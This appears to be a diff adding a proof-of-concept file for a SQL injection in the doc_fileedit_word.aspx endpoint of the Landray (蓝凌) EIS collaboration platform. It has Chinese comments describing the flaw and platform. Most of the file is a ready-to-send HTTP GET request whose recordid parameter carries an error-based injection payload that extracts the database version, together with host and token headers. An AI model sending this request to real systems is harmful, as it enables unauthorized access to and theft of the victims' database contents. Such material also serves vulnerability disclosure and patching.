@@ -1,0 +1,10 @@
+# 蓝凌EIS智慧协同平台doc_fileedit_word SQL注入漏洞
+# 蓝凌EIS智慧协同平台是一款专为成长型企业打造的智慧办公云平台，深度融合了阿里钉钉的功能。该平台旨在通过增强组织的协同在线、业务在线和生态在线，提升企业的工作效率和管理便捷性。
+# 蓝凌EIS智慧协同平台doc_fileedit_word.aspx接口未进行过滤和验证导致存在SQL注入漏洞，攻击者通过该漏洞可获取数据库敏感信息。
+GET /dossier/doc_fileedit_word.aspx?acid=80052385&recordid=1%27%20and%201=@@version--+&edittype=1%2C1&bid=hd_tag_m8mv24wg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24wg
+RM-PRO-Token: ce97448131e7cee34fd860065db09654
+RM-PRO-Time: 1742808419102
+User-Agent: curl/7.83.1
+
